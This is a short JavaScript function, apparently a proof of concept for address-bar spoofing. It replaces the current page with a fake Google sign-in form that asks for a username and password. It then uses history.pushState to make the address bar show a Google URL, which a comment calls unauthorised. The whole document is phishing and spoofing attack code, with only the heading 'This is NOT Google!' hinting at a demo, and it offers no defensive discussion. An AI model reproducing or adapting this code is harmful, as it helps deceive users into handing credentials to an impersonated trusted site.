function spoof() {
    let win = window.open("", "_self");
    let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' + 
        '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' + 
        '<h1>This is NOT Google!</h1>' + 
        '<p>Please enter your credentials:</p>' + 
        '<form style="margin-top:20px;">' + 
        '<input type="text" placeholder="Username" style="display:block; margin:10px auto; padding:8px; width:200px;">' + 
        '<input type="password" placeholder="Password" style="display:block; margin:10px auto; padding:8px; width:200px;">' + 
        '<button type="submit" style="padding:8px 16px; background-color:#4285F4; color:white; border:none; cursor:pointer;">Sign In</button>' + 
        '</form>' + 
        '</div>';
    win.document.write(payload);
    win.document.close();
    win.history.pushState({}, "", "https://www.google.com:8080"); // Ubah alamat bar dengan cara yang tidak sah
}
